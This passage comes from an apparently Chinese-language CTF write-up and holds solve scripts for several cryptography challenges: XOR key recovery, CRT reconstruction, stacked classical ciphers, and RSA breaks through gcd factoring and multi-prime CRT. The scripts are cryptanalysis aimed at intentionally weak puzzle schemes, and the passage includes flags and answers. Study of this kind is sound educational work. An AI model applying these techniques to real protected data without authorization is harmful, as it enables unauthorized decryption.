data-num=\"40\"></td><td><pre><span class=\"token comment\"># Here's what hacker Eve got:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    c1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    c2 <span class=\"token operator\">=</span> s2<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    c3 <span class=\"token operator\">=</span> s3<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    m_ <span class=\"token operator\">=</span> s4<span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span> HACK <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>k1<span class=\"token punctuation\">,</span>k2 <span class=\"token operator\">=</span> s0<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>encrypt_<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>b'\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9'</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>b'o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR'</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>b'\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96'</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> xor </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>C1<span class=\"token operator\">=</span><span class=\"token string\">b'\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>C2<span class=\"token operator\">=</span><span class=\"token string\">b'o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>C3<span class=\"token operator\">=</span><span class=\"token string\">b'\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>K1<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>C2<span class=\"token punctuation\">,</span>C3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>K2<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>C2<span class=\"token punctuation\">,</span>C1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>K1<span class=\"token punctuation\">,</span>C1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"oldalgorithm\"><a class=\"markdownIt-Anchor\" href=\"#oldalgorithm\">#</a> OldAlgorithm</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> msg<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">:</span> msg<span class=\"token operator\">+</span>os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p='</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">chinese_remainder_theorem</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># 计算模数的乘积</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    N <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        N <span class=\"token operator\">*=</span> i</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\"># 计算每个模数的乘积</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        Ni <span class=\"token operator\">=</span> N <span class=\"token operator\">//</span> p<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\"># 计算模反元素</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        Mi <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>Ni<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\"># 计算部分解密结果</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        result <span class=\"token operator\">+=</span> c<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> Ni <span class=\"token operator\">*</span> Mi</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\"># 取最小正整数解</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    flag <span class=\"token operator\">=</span> result <span class=\"token operator\">%</span> N</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">58657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47963</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57653</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56923</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41809</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49639</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44417</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38639</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39857</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53609</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55621</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44647</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57131</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64007</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46349</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39313</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44909</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40763</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46727</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34057</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56333</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">36086</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4005</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3350</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23179</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34246</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32490</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16348</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13628</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7742</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46317</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50824</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23718</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32995</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7640</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10590</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46897</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39245</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16633</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31488</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36547</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52782</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31929</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29026</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18748</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6634</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8126</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5197</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>flag <span class=\"token operator\">=</span> chinese_remainder_theorem<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"easy_classic\"><a class=\"markdownIt-Anchor\" href=\"#easy_classic\">#</a> easy_classic</h3>\n<p>古典密码的套</p>\n<p>第一层： udzeojxuwqcu</p>\n<p>凯撒 16：enjoythegame</p>\n<p>第二层：ialhhooavtepcyr</p>\n<p>栅栏 7：ilovecryptohaha</p>\n<p>第三层：5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</p>\n<p>base64: 宇宙万法的那个源头</p>\n<p>第四层：呋食食食取噗山笨笨破嗄咯哈動嗡雜類嗒嘿啽沒歡破吖咬我啽寶盜噔咯沒</p>\n<p>熊曰解密：never gonna give you up</p>\n<p>第五层：👝👘👠👩👞👘👤👜</p>\n<p>base100 找 key:fairgame</p>\n<p>根据 fairgame 得知加密为 Playfair：genshinstart</p>\n<pre><code>SYC&#123;classical_1s_fun&#125;\n</code></pre>\n<h3 id=\"polyrsa\"><a class=\"markdownIt-Anchor\" href=\"#polyrsa\">#</a> PolyRSA</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> math</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> inverse</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e1 <span class=\"token operator\">=</span> <span class=\"token number\">113717</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>e2 <span class=\"token operator\">=</span> <span class=\"token number\">80737</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token number\">97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token number\">353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>q <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>e1<span class=\"token operator\">*</span>e2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> e1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>e1<span class=\"token operator\">*</span>e2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> q</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"fi1nd_th3_x\"><a class=\"markdownIt-Anchor\" href=\"#fi1nd_th3_x\">#</a> Fi1nd_th3_x’</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> functools <span class=\"token keyword\">import</span> <span class=\"token builtin\">reduce</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span> <span class=\"token number\">13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q<span class=\"token operator\">=</span> <span class=\"token number\">12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r<span class=\"token operator\">=</span> <span class=\"token number\">12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dp<span class=\"token operator\">=</span> <span class=\"token number\">116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dq<span class=\"token operator\">=</span> <span class=\"token number\">44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dr<span class=\"token operator\">=</span> <span class=\"token number\">60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">union</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    a1<span class=\"token punctuation\">,</span> m1 <span class=\"token operator\">=</span> x1</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    a2<span class=\"token punctuation\">,</span> m2 <span class=\"token operator\">=</span> x2</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span> 